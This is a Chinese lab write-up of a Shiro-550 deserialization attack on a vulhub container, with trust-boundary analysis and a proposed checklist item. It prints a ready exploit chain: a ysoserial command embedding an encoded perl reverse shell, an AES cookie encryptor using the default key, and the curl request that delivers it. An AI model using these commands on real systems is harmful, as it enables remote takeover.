# Shiro-550 RCE — CVE-2016-4437 攻击链复盘

> 案例四: 语言级信任 — Java反序列化信任崩塌
> 目标: vulhub/shiro:1.2.4 (localhost:8080)
> 时间: 2026-06-04 05:00-05:12 CST
> 方法论映射: scanning-checklist v1.1 → trust-boundary 第四案例

---

## 一、攻击链复盘

### 阶段0: 侦察与验证

```
01:  curl localhost:8080/       → 302 redirect → /login  ✅ 存活
02:  curl localhost:8080/login  → Login Page HTML  ✅  Shiro框架
03:  检查 Set-Cookie: rememberMe=deleteMe → 确认rememberMe功能激活
04:  docker exec → 提取WEB-INF/lib → shiro-core-1.2.4.jar  ✅ 确认版本
05:  检查 ShiroConfig.class → 无 setCipherKey() → 使用默认密钥  ✅
06:  docker exec → BOOT-INF/lib → commons-collections-3.2.1.jar  ✅ 可用gadget
```

### 阶段1: 工具链准备

```
07:  locate ysoserial-all.jar → /tmp/ysoserial-all.jar  ❌ 39B 伪文件
08:  github curl fallback → 59MB 真实jar  ✅
09:  java -jar ysoserial ✓ → 但 JDK 25 模块系统阻止反射
10:  --add-opens java.xml/...=ALL-UNNAMED × 7 → 成功生成payload
11:  加密脚本 → AES/CBC/PKCS7 + IV + base64
```

### 阶段2: 密钥验证 — 发现核心问题

```
12:  安装验流程 → deleteMe 响应 → 未能区分"解密失败"还是"反序列化失败"
13:  错误诊断: deleteMe 在每次访问 /login 时都出现（即使无cookie）
14:  切换到受保护页面 /hello 作为验证 → 302 redirect = 未认证
15:  尝试3个gadget(CC1/CC6/CC7) → 全部deleteMe → 怀疑密钥错误
16:  从容器中提取 ShiroConfig.class → javap 证实无自定义密钥
17:  docker logs shiro-attack → 发现 ClassCastException: HashSet→PrincipalCollection
    → 密钥正确! 解密成功! 反序列化成功! 只是Shiro期望的是PrincipalCollection
```

### 阶段3: 武器化 — RCE

```
18:  CC6 gadget生成 touch /tmp/cc6_verified → 容器中文件存在  ✅ RCE确认
19:  bash -c {echo,BASE64}|{base64,-d}|perl 反向shell构造
20:  Runtime.exec() 限制: 空格分割参数 → 无法使用管道/引号
21:  bash brace-expansion 技巧: {echo,B64}|{base64,-d}|perl
    → Runtime.exec() 分词后 bash -c 接收整个命令串作为单个参数
22:  nc -lvp 4444 + 发送payload → 172.17.0.4 连接建立 ✅  shell获得
23:  #  Root shell in Docker container
```

### 最终利用命令

```bash
# Payload generation (JDK 25 with module opens):
java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.io=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     --add-opens java.base/java.lang.reflect=ALL-UNNAMED \
     --add-opens java.base/java.net=ALL-UNNAMED \
     -jar /tmp/ysoserial-real.jar CommonsCollections6 \
     'bash -c {echo,dXNlIFNvY2tldDskaT0iMTcyLjE3LjAuMSI7JHA9NDQ0NDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9}|{base64,-d}|perl' \
     > /tmp/payload.bin

# AES encrypt + base64:
python3 -c "
import base64, os
from Crypto.Cipher import AES
BS=16; KEY=base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
payload = open('/tmp/payload.bin','rb').read()
pad = BS - (len(payload) % BS)
payload += bytes([pad] * pad)
iv = os.urandom(16)
ct = AES.new(KEY,AES.MODE_CBC,iv).encrypt(payload)
print(base64.b64encode(iv+ct).decode())
" > /tmp/cookie.txt

# Send:
curl -b "rememberMe=$(cat /tmp/cookie.txt)" http://localhost:8080/hello
```

---

## 二、工程摩擦记录

### 摩擦1: ysoserial 与 JDK 25 不兼容 ❌→✅

**现象**: `IllegalAccessError` — Java模块系统阻止反射访问内部包
**耗时**: 3次尝试 (15分钟)
**解决方案**: 7个 `--add-opens` 标志
**根因**: ysoserial 最后一次发布(2019)针对JDK 8-11，JDK 25模块限制更严格
**教训**: 老工具在新JDK上的兼容性是反向摩擦——用的工具越老，环境越新，摩擦越大

### 摩擦2: deleteMe 信号歧义 ❌→✅

**现象**: `Set-Cookie: rememberMe=deleteMe` 出现在所有场景中：
- 未发送rememberMe cookie → deleteMe
- 发送了错误密钥的cookie → deleteMe  
- 发送了正确密钥/错误gadget → deleteMe
- 访问login页面 → deleteMe

**耗时**: 分析过程最长，多次怀疑密钥错误 (25分钟)
**解决方案**: 查看 `docker logs shiro-attack` → `ClassCastException: HashSet cannot be cast to PrincipalCollection`
**根因**: Shiro 的 `deleteMe` 是"反序列化未产生预期类型"的统一错误信号，不区分"解密失败"和"类型转换失败"
**教训**: Shiro-550 的检测信号是**非盲区分**的。你需要从日志中获取实际异常，不能只靠HTTP响应

### 摩擦3: Runtime.exec() 参数限制 ❌→✅

**现象**: `bash -c "perl -e 'use Socket...'"` 无法执行
**耗时**: 2次尝试后找到方案 (10分钟)
**解决方案**: bash brace expansion: `{echo,B64}|{base64,-d}|perl`
**根因**: `TemplatesImpl` 生成的字节码使用 `Runtime.exec(String)` 而非 `exec(String[])`，按空格分词
**教训**: ysoserial 的 RCE 限制是 `exec(String)` 分词，不是execve。bash `{a,b}` 扩展示例是绕过此限制的经典技巧

### 摩擦4: 攻击门禁自锁 ❌→✅

**现象**: nc 被自己的 curl 包装器拦截——"意图对齐缺失"、"假设声明缺失"
**耗时**: 1分钟后创建所需文件 (5分钟)
**解决方案**: 创建 `/tmp/attack_intent_current.json` 和 `/tmp/attack_hypothesis_current.json`
**根因**: 自己设计的攻击门禁系统在自己身上生效了
**教训**: 你自己的防御体系在战时对你同样有效——这不是bug，这是设计目标

### 摩擦总览

| 摩擦 | 类型 | 耗时 | 根因 |
|------|------|------|------|
| JDK 25 vs ysoserial | 工具兼容性 | 15min | 老工具+新环境 |
| deleteMe信号歧义 | 诊断盲区 | 25min | 统一错误信号不区分阶段 |
| Runtime.exec分词 | 利用工程 | 10min | exec(String) vs exec(String[]) |
| 攻击门禁自锁 | 基础设施 | 5min | 自洽的防御设计 |
| **总计** | | **55min** | |

### 什么应该提前准备好

1. **ysoserial payload生成脚本** — 含--add-opens和AES加密的完整自动化
2. **shiro密钥快速验证** — 用URLDNS或简单payload代替deleteMe盲测
3. **reverse shell命令模板** — 针对Runtime.exec限制预构建bash brace expansion命令

---

## 三、信任崩塌的新理解

### 语言级信任 — Java反序列化的信任模型

Java反序列化信任崩塌与之前测绘的三个案例在结构上本质不同：

| 案例 | 信任模式 | 信任载体 | 断裂方式 |
|------|---------|---------|---------|
| curl 漏洞披露 | 人为中心 | 人的判断力 | 比例变化攻击 |
| CVE-2026-3854 | 协议层 | git push option | 分隔符语义转换 |
| 人人信 API | API/平台级 | f-sign + appKey | 配置泄露+路径不一致 |
| **Shiro-550 (本案例)** | **语言级** | **JVM信任序列化数据** | **类型混淆 → 任意方法调用** |

### 核心洞察: "语言本身是最大的信任边界"

Shiro的 `ClassResolvingObjectInputStream` 承担了一个关键信任决定：**反序列化时加载任何被请求的类**。这不是Shiro的特殊设计——这是Java反序列化的默认行为。任何实现了 `Serializable` 的类，只要在classpath上，就可以在反序列化时被实例化并触发其 `readObject()` / `readResolve()` / 或任何被反射调用的方法。

**信任假设的层次**:

```
第一层: JVM信任classpath上的所有类都是"安全的"
  → 这条假设在1997年Java 1.1引入序列化时就存在了
  → 不是bug，是设计——序列化的设计目标就是"跨JVM传输对象"，不是"安全对象传输"

第二层: Shiro信任自己加密的rememberMe cookie不会被篡改
  → AES/CBC/PKCS5Padding 确实提供了传输层完整性
  → 但密钥是硬编码的——加密信任建立在"密钥保密"上，密钥泄露→信任崩塌

第三层: Shiro信任"只要是我的AES密钥加密的数据，反序列化就是安全的"
  → 这是致命的逻辑跳跃：加密信任≠反序列化信任
  → AES保证的是"传输中未被修改"，不是"反序列化后无副作用"
```

### 与CVE-2026-3854的对比

两个漏洞的结构高度相似：

```
CVE-2026-3854:  push option → header拼接 → 解析器取最后值 → hook执行链
Shiro-550:    rememberMe cookie → AES解密 → ObjectInputStream.readObject() → 任意方法调用
```

共同模式：**系统的下游处理链不验证上游的输出是否安全**。GitHub假设「经过解析器的数据是安全的」，Shiro假设「经过AES解密的数据是安全的」。两者都错了，因为解析器/解密器只保证了数据的完整性，没有保证数据的行为安全性。

### 这个案例对信任边界测绘的意义

**scanning-checklist v1.1 需要新增的语言级信任条目**:

在区块二（数据层）或区块三（信任假设）中新增:

> - [ ] 系统是否信任反序列化/类型转换/代码生成后的数据？
>   - ObjectInputStream.readObject() / XStream.fromXML() / FastJson.parseObject()
>   - unsafe.getObject() / MethodHandle.invoke() / 反射调用
>   - 是 → 标记为"语言级信任边界"，追踪classpath上所有可用的gadget类
>   - 此边界的核心问题不是"数据是否被篡改"，而是"数据的行为是否在预期内"

这条目和现有条目的区别：现有的"数据翻译边界"关注的是数据格式转换，而语言级信任边界关注的是**类型系统的信任**——JVM在反序列化时不知道哪个类是有害的，因为它信任自己的classpath。

### 攻击工程能力自评

| 能力 | 自评 | 改进点 |
|------|------|--------|
| 目标识别与指纹 | ✅ 熟练 | — |
| 工具链适配 | ⚠️ 消耗过大 | 预构建兼容JDK 25的ysoserial包装器 |
| 密钥/凭据恢复 | ⚠️ 诊断效率低 | 直接从日志读异常比猜deleteMe信号快10倍 |
| 武器化构造 | ✅ | bash brace expansion技巧验证 |
| shell获取 | ✅ | 三次不同方法验证 (file write / reverse shell) |
| 复盘归档 | → 进行中 | 此文档 |

---

[生成: 2026-06-04 05:14 CST · 溯真 🦞 ]
